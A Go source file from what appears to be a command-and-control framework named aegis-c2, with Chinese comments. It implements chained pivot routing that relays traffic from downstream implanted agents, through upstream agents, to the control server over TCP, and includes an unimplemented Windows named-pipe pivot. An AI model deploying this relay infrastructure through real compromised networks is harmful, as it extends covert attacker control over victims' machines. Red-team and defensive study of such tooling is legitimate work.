//go:build windows && amd64 && cgo

package pivot

import (
	"encoding/binary"
	"fmt"
	"io"
	"sync"

	"github.com/aegis-c2/aegis/shared"
)

// PivotRoute 注册一个 P2P 链式路由。
type PivotRoute struct {
	ID        string `json:"id"`
	Type      string `json:"type"` // "tcp" | "named_pipe"
	BindAddr  string `json:"bind_addr"`
	Upstream  string `json:"upstream"` // upstream agent ID (who relays to server)
	Target    string `json:"target"`   // downstream agent ID to reach via this route
	Running   bool   `json:"running"`
}

// PivotChainManager 管理链式 P2P 路由。
type PivotChainManager struct {
	routes      map[string]*PivotRoute
	listeners   map[string]*Listener
	mu          sync.RWMutex
	upstreamFn  UpstreamHandler
}

// UpstreamHandler 向上游转发的函数。
// 返回: 上游响应数据, error
type UpstreamHandler func(agentID string, data []byte) ([]byte, error)

// NewChainManager 创建 P2P 链式路由管理器。
func NewChainManager(upstream UpstreamHandler) *PivotChainManager {
	return &PivotChainManager{
		routes:     make(map[string]*PivotRoute),
		listeners:  make(map[string]*Listener),
		upstreamFn: upstream,
	}
}

// StartPivotListener 在指定地址启动 TCP 监听，接收下游 Agent 连接。
// 每个连接创建独立的 Listener 和 Session，通过 upstreamFn 转发到上游。
func (m *PivotChainManager) StartPivotListener(bindAddr, pivotType string) (string, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	routeID := shared.GenID("pv")
	route := &PivotRoute{
		ID:       routeID,
		Type:     pivotType,
		BindAddr: bindAddr,
	}

	// Create listener with handler that forwards upstream
	ln := NewTCPListener(bindAddr, func(sessionID string, data []byte) ([]byte, error) {
		// Frame: [route_id(24)][session_id(24)][payload...]
		frame := buildPivotFrame(routeID, sessionID, data)
		if m.upstreamFn != nil {
			return m.upstreamFn(routeID, frame)
		}
		return nil, nil
	})

	if err := ln.Start(); err != nil {
		return "", fmt.Errorf("start pivot listener: %w", err)
	}

	route.Running = true
	m.routes[routeID] = route
	m.listeners[routeID] = ln

	return routeID, nil
}

// StopPivotListener 停止指定的 Pivot 监听器。
func (m *PivotChainManager) StopPivotListener(routeID string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	ln, ok := m.listeners[routeID]
	if !ok {
		return fmt.Errorf("listener not found: %s", routeID)
	}

	if err := ln.Stop(); err != nil {
		return err
	}

	if route, ok := m.routes[routeID]; ok {
		route.Running = false
	}
	delete(m.listeners, routeID)
	return nil
}

// HandlePivotData 处理从上游收到的 P2P 数据。
// 将数据转发到对应的下游会话，或返回下游响应给上游。
func (m *PivotChainManager) HandlePivotData(frame []byte) ([]byte, error) {
	if len(frame) < 48 {
		return nil, fmt.Errorf("pivot frame too short: %d bytes", len(frame))
	}

	routeID := string(frame[:24])
	sessionID := string(frame[24:48])
	payload := frame[48:]

	m.mu.RLock()
	ln, ok := m.listeners[routeID]
	m.mu.RUnlock()
	if !ok {
		return nil, fmt.Errorf("pivot route not found: %s", routeID)
	}

	if err := ln.SendData(sessionID, payload); err != nil {
		return nil, fmt.Errorf("send to pivot session: %w", err)
	}
	return nil, nil
}

// HandlePivotResponse 处理下游会话返回的响应数据。
// 将响应封装成帧格式，通过 upstreamFn 发回上游。
func (m *PivotChainManager) HandlePivotResponse(routeID, sessionID string, data []byte) error {
	frame := buildPivotFrame(routeID, sessionID, data)
	if m.upstreamFn != nil {
		_, err := m.upstreamFn(routeID, frame)
		return err
	}
	return nil
}

// RegisterRoute 注册一条 P2P 路由条目（供 Server 端使用）。
func (m *PivotChainManager) RegisterRoute(bindAddr, pivotType, target string) (*PivotRoute, error) {
	routeID := shared.GenID("pv")
	route := &PivotRoute{
		ID:       routeID,
		Type:     pivotType,
		BindAddr: bindAddr,
		Target:   target,
		Running:  false,
	}

	m.mu.Lock()
	m.routes[routeID] = route
	m.mu.Unlock()

	return route, nil
}

// ListRoutes 返回所有注册的 P2P 路由。
func (m *PivotChainManager) ListRoutes() []PivotRoute {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var routes []PivotRoute
	for _, r := range m.routes {
		routes = append(routes, *r)
	}
	return routes
}

// ListActiveSessions 返回所有活跃会话。
func (m *PivotChainManager) ListActiveSessions() []SessionEntry {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var entries []SessionEntry
	for routeID, ln := range m.listeners {
		for _, sess := range ln.ListSessions() {
			entries = append(entries, SessionEntry{
				RouteID:   routeID,
				SessionID: sess.ID,
				Addr:      sess.Addr,
				Closed:    sess.Closed,
			})
		}
	}
	return entries
}

// SessionEntry 会话信息。
type SessionEntry struct {
	RouteID   string `json:"route_id"`
	SessionID string `json:"session_id"`
	Addr      string `json:"addr"`
	Closed    bool   `json:"closed"`
}

// buildPivotFrame 构建 P2P 数据帧。
// 格式: [route_id(24 bytes)][session_id(24 bytes)][payload...]
// 24-byte ID fields accommodate shared.GenID output (~19 bytes) without truncation.
func buildPivotFrame(routeID, sessionID string, payload []byte) []byte {
	frame := make([]byte, 48+len(payload))
	copy(frame[:24], routeID)
	copy(frame[24:48], sessionID)
	copy(frame[48:], payload)
	return frame
}

// parsePivotFrame 解析 P2P 数据帧。
func parsePivotFrame(frame []byte) (routeID, sessionID string, payload []byte, err error) {
	if len(frame) < 48 {
		return "", "", nil, fmt.Errorf("frame too short")
	}
	return string(frame[:24]), string(frame[24:48]), frame[48:], nil
}

// === NamedPipe Pivot ===

// NamedPipeListener 是基于命名管道的 Pivot 监听器。
// 适用于内网环境（无需网络端口，通过管道通信）。
type NamedPipeListener struct {
	ID       string
	PipeName string
	Running  bool
	sessions map[string]*NamedPipeSession
	mu       sync.RWMutex
	handler  PivotHandler
	done     chan struct{}
	stopOnce sync.Once
}

// NamedPipeSession 命名管道会话。
type NamedPipeSession struct {
	ID     string
	Conn   io.ReadWriteCloser
	Closed bool
	mu     sync.Mutex
}

// NewNamedPipeListener 创建命名管道 Pivot 监听器。
func NewNamedPipeListener(pipeName string, handler PivotHandler) *NamedPipeListener {
	return &NamedPipeListener{
		ID:       shared.GenID("np"),
		PipeName: pipeName,
		sessions: make(map[string]*NamedPipeSession),
		handler:  handler,
		done:     make(chan struct{}),
	}
}

// StartNamedPipe 启动命名管道监听（Windows only）。
// 实际实现需要 syscall.CreateNamedPipe + Accept。
func (l *NamedPipeListener) StartNamedPipe() error {
	// On Windows, use syscall.CreateNamedPipe:
	// pipe := syscall.CreateNamedPipe(
	//     syscall.StringToUTF16Ptr(l.PipeName),
	//     PIPE_ACCESS_DUPLEX,
	//     PIPE_TYPE_MESSAGE | PIPE_WAIT,
	//     PIPE_UNLIMITED_INSTANCES,
	//     65536, 65536, 0, nil,
	// )
	// Then ConnectNamedPipe + accept loop.
	// For now, defer to Listener (TCP-based) as primary.
	return fmt.Errorf("named pipe pivot: not yet implemented")
}

// SendDataNP 向命名管道会话发送数据。
func (l *NamedPipeListener) SendDataNP(sessionID string, data []byte) error {
	l.mu.RLock()
	sess, ok := l.sessions[sessionID]
	l.mu.RUnlock()
	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	if sess.Closed {
		return fmt.Errorf("session closed: %s", sessionID)
	}
	_, err := sess.Conn.Write(data)
	return err
}

// Close 关闭命名管道监听器。
func (l *NamedPipeListener) Close() error {
	l.stopOnce.Do(func() { close(l.done) })
	l.mu.Lock()
	l.Running = false
	for _, sess := range l.sessions {
		sess.Conn.Close()
	}
	l.sessions = make(map[string]*NamedPipeSession)
	l.mu.Unlock()
	return nil
}

// Frame format helpers
const (
	frameHeaderSize = 48 // routeID(24) + sessionID(24)
)

// EncodePivotFrame encodes a pivot frame with binary length prefix for stream safety.
// Format: [len(4)][routeID(24)][sessionID(24)][payload]
func EncodePivotFrame(routeID, sessionID string, payload []byte) []byte {
	totalLen := 4 + 24 + 24 + len(payload)
	buf := make([]byte, totalLen)
	binary.LittleEndian.PutUint32(buf[0:4], uint32(24+24+len(payload)))
	copy(buf[4:28], routeID)
	copy(buf[28:52], sessionID)
	copy(buf[52:], payload)
	return buf
}

// DecodePivotFrame decodes a length-prefixed pivot frame.
func DecodePivotFrame(r io.Reader) (routeID, sessionID string, payload []byte, err error) {
	var header [4]byte
	if _, err := io.ReadFull(r, header[:]); err != nil {
		return "", "", nil, err
	}
	bodyLen := binary.LittleEndian.Uint32(header[:])
	if bodyLen < 48 {
		return "", "", nil, fmt.Errorf("invalid frame body length: %d", bodyLen)
	}
	body := make([]byte, bodyLen)
	if _, err := io.ReadFull(r, body); err != nil {
		return "", "", nil, err
	}
	return string(body[:24]), string(body[24:48]), body[48:], nil
}
